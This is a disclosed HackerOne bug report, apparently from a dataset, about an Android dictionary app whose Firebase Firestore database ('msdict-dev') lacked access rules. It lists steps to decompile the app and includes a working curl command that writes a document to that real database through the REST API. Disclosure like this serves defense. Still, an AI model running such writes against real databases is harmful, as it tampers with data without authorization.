---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '731724'
original_report_id: '731724'
title: Firebase Firestore insecure database
team_handle: mobisystems_ltd
created_at: '2019-11-07T20:16:05.642Z'
disclosed_at: '2020-02-13T16:57:23.340Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: com.mobisystems.msdict.embedded.wireless.oxford.dictionaryofenglish
asset_type: GOOGLE_PLAY_APP_ID
max_severity: critical
tags:
- hackerone
---

# Firebase Firestore insecure database

## Metadata

- HackerOne Report ID: 731724
- Weakness: 
- Program: mobisystems_ltd
- Disclosed At: 2020-02-13T16:57:23.340Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
The app is exposing a firebase database url that has no read/write protections.

## Steps To Reproduce:
  1. Decompile the Android app
  2. Do a string search for `firebase_database`
  3. Use the project name (i.e. `msdict-dev`) in combination with the Firestore REST API to modify the database.

## Supporting Material/References:
Via decompilation an attacker can get the project name for a Firebase database. Then they can use the Firestore REST API to modify the DB.
I was able to add a new document to the DB with the following script.

`curl  https://firestore.googleapis.com/v1/projects/msdict-dev/databases/%28default%29/documents/test   -H 'Content-Type: application/json'   -d '{ "fields": { "title": { "stringValue": "TEST" }} }'`

to view the document that was added just visit:

`https://firestore.googleapis.com/v1/projects/msdict-dev/databases/%28default%29/documents/test`

## Impact

An attacker has access to an insecure database.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
